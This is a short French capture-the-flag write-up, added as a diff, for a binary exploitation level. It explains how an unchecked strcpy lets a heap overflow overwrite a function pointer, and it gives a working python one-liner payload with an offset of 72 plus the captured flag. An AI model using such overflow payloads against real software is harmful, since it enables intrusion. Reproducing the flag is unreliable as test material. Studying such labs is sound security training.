@@ -1,0 +1,27 @@
+i functions : 
+
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+
+La fonction m appelle juste un puts("Nope") et la fonction 'n' affiche le pass du level7
+
+En début de main, on a deux malloc (de size 64 puis 4)
+A la fin du main, on a  un appel à strcpy qui copie la chaine entrée en paramètre (argv[1]) dans la première chaine de char (64) sans vérification de taille
+Ensuite on a un call à la valeur qui est dans la chaine de 4 (chars).
+Il faut donc réussir à mettre dans cette chaine n°2, l'adresse de la fonction "n"
+
+Les deux chaines sont sur la heap, la première à l'adresse ___ et la seconde : ?
+On utilise une chaine en entrée qui va permettre de trouver l'adresse de la seconde chaine => "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
+
+Segfault en essayant d'exécuter l'adresse "0x41346341" => A4cA => Ac4A (reverse) donc offset 72
+
+
+Commande : 
+
+> ./level6 $(python -c "print ('A'*72 + '\x08\x04\x84\x54'[::-1])")
+
+
+Flag : 
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
